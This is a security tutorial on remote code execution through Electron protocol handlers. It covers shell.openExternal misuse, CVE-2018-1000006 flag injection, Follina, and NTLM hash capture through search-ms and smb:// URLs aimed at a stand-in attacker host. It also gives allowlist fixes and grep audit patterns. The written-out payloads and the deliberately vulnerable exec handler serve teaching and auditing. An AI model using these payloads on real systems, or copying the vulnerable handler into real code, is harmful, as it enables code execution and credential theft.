---
title: Protocol Handler RCE
description: Exploiting custom and OS protocol handlers in Electron — shell.openExternal, Follina, and CVE-2018-1000006
---

# Protocol Handler RCE

Here's the thing about `shell.openExternal(url)`: Electron doesn't open that URL. It hands the URL to the operating system and steps back. Whatever happens next is entirely up to the OS and whatever application is registered to handle that URL scheme.

For `https://` that's a browser. For `mailto:` that's an email client. For `ms-msdt://` on unpatched Windows, that's the Microsoft Support Diagnostic Tool, which under certain conditions executes arbitrary commands. For `smb://` that's Windows Explorer trying to authenticate to a file share — which means the victim's Net-NTLMv2 hash goes to whoever runs that share.

The vulnerability isn't in Electron. The vulnerability is in giving attacker-controlled URLs to `shell.openExternal` without checking what scheme they're using first.

---

## The Core Pattern

```javascript
// Somewhere in an Electron app's IPC handlers or preload bridge:
function openLink(url) {
  shell.openExternal(url);  // delegates entirely to the OS
}

// Attacker controls url and sends:
// 'ms-msdt://'     → Microsoft Support Diagnostic Tool (Follina — RCE)
// 'search-ms://'   → Windows Search protocol
// 'smb://'         → NTLM hash capture
// 'file://'        → open local executables
// 'ssh://'         → launch SSH client with attacker-controlled server
```

Any collaboration app, any link-clicking mechanism, any URL opening that passes attacker-controlled content to `shell.openExternal` is potentially in scope.

---

## CVE-2018-1000006: The Protocol Registration Bug

**Affected:** Electron < 1.8.2-beta.4, < 1.7.12, < 1.6.17
**Platform:** Windows
**Impact:** RCE via crafted URL, no user interaction beyond clicking a link

When an Electron app registers itself as the handler for a custom URL scheme on Windows (via `app.setAsDefaultProtocolClient('myapp')`), Windows writes a registry entry like this:

```
HKEY_CLASSES_ROOT\myapp\shell\open\command
  = "C:\Program Files\MyApp\app.exe" "%1"
```

The `%1` is the URL. On Windows, URLs passed as command-line arguments can include additional flags separated by spaces. An attacker crafts:

```
myapp:// --inspect-brk=9229
```

Windows expands this to:

```
"C:\Program Files\MyApp\app.exe" "myapp:// --inspect-brk=9229"
```

Electron receives `--inspect-brk=9229` as a command-line flag. The Node.js debugger opens on port 9229. Attacker connects and executes arbitrary JavaScript in the main process.

**The fix is one character:**

```
"C:\Program Files\MyApp\app.exe" -- "%1"
```

`--` tells the argument parser to stop processing flags. Everything after is treated as a positional argument, not a flag. Apps on vulnerable Electron versions that use `setAsDefaultProtocolClient` should verify they're on a patched version or that their registry entries include `--`.

---

## Windows Protocol Attacks via shell.openExternal

### ms-msdt — Follina (CVE-2022-30190)

Follina was a big deal when it dropped in 2022. The Microsoft Support Diagnostic Tool registered `ms-msdt://` as a protocol, and calling it with crafted parameters executed arbitrary commands on unpatched Windows:

```javascript
shell.openExternal(
  'ms-msdt:/id PCWDiagnostic /skip force /param ' +
  '"IT_RebrowseForFile=? IT_SelectProgram=NotListed ' +
  'IT_BrowseForFile=/../../../../../../Windows/System32/mpsigdb.cab$(calc)' +
  'IT_AutoTroubleshoot=ts_auto"'
);
// → Follina RCE on unpatched Windows
```

Follina is patched (KB5014699), but it illustrated exactly why `shell.openExternal` needs scheme validation. The Electron app is just a delivery mechanism — the OS does the damage.

### search-ms — Windows Search Coercion

```javascript
shell.openExternal('search-ms:query=test&crumb=location:\\\\attacker.com\\share');
// → Windows Explorer attempts to open the search location
// → Triggers NTLM authentication to attacker's server
// → Net-NTLMv2 hash captured → crack offline or relay to another service
```

### smb:// — NTLM Hash Capture

```javascript
shell.openExternal('smb://attacker-smb-server/share');
// Windows automatically authenticates with NTLM
// Net-NTLMv2 hash captured → crackable offline with hashcat
```

This one doesn't need Follina to be unpatched. Windows will always try to authenticate to SMB shares. The attacker just needs to run Responder or impacket on their end.

### file:// — Direct Execution

```javascript
// On Windows, file:// URLs pointing to executables get opened:
shell.openExternal('file:///C:/Windows/System32/calc.exe');
shell.openExternal('file:///C:/Users/Public/evil.exe');

// On macOS, open .app bundles:
shell.openExternal('file:///tmp/malicious.app');
```

On Windows, this depends somewhat on the file type and UAC settings, but for executables in world-writable locations it frequently works.

---

## Custom Protocol Handler Registration — Your Own Attack Surface

Apps that register custom schemes aren't just *using* protocol handlers — they're *creating* a new attack surface that any website on the internet can trigger:

```javascript
// main.js — registers 'myapp://' scheme:
app.setAsDefaultProtocolClient('myapp');

// Handles incoming URLs:
app.on('open-url', (event, url) => {
  event.preventDefault();
  handleURL(url);  // url is fully attacker-controlled!
});

function handleURL(url) {
  const parsed = new URL(url);
  
  // VULNERABLE: uses pathname as a file path:
  const filePath = parsed.pathname;
  const content = fs.readFileSync(filePath);  // arbitrary file read
  
  // VULNERABLE: uses query param as a command:
  const cmd = parsed.searchParams.get('cmd');
  exec(cmd);  // RCE
}
```

The key point: **any website** can trigger this. A link on attacker.com to `myapp://open?cmd=calc.exe` will open a browser dialog asking "Do you want to open this link with MyApp?" On macOS, no dialog — it just fires.

This is a cross-origin invocable surface. The app registers a protocol, and from that moment any web page in any browser can invoke it with any parameters.

---

## Fixing This

### Allowlist URL schemes before calling openExternal:

```javascript
function safeOpenExternal(url) {
  let parsed;
  try {
    parsed = new URL(url);
  } catch {
    return;  // invalid URL
  }
  
  const allowedSchemes = ['https:', 'http:', 'mailto:'];
  if (!allowedSchemes.includes(parsed.protocol)) {
    // Log and drop — don't open unknown schemes
    console.warn(`Blocked URL scheme: ${parsed.protocol}`);
    return;
  }
  
  shell.openExternal(url);
}
```

### Strictly validate protocol handler parameters:

```javascript
app.on('open-url', (event, url) => {
  event.preventDefault();
  
  const parsed = new URL(url);
  
  // Must be our scheme:
  if (parsed.protocol !== 'myapp:') return;
  
  // Allowlist actions — never execute params directly:
  const action = parsed.hostname;
  const allowedActions = ['open', 'compose', 'settings'];
  if (!allowedActions.includes(action)) return;
  
  // Validate each parameter individually with tight patterns:
  const id = parsed.searchParams.get('id');
  if (!/^[a-zA-Z0-9_-]{1,64}$/.test(id)) return;
  
  handleAction(action, id);
});
```

---

## Grep Patterns

```bash
# shell.openExternal — always audit:
grep -rn "shell\.openExternal" --include="*.js" . -B 5 | grep -v node_modules

# Check if there's URL validation before the call:
grep -rn "openExternal" --include="*.js" . -B 10 | \
  grep -E "new URL|protocol\b|allowedSchemes\|startsWith.*https" | grep -v node_modules

# Protocol handler registration:
grep -rn "setAsDefaultProtocolClient\|registerFileProtocol\|registerStringProtocol\|protocol\.handle" \
  --include="*.js" . | grep -v node_modules

# open-url event (macOS/Windows protocol dispatch):
grep -rn "'open-url'\|\"open-url\"" --include="*.js" . | grep -v node_modules
```

The question to answer isn't just "does `shell.openExternal` exist?" — almost every Electron app that opens links uses it. The question is: **is the URL validated before it gets there?** Check the 10 lines before each `shell.openExternal` call for a `new URL()` parse followed by a protocol allowlist check. If that's not there, you have a finding.
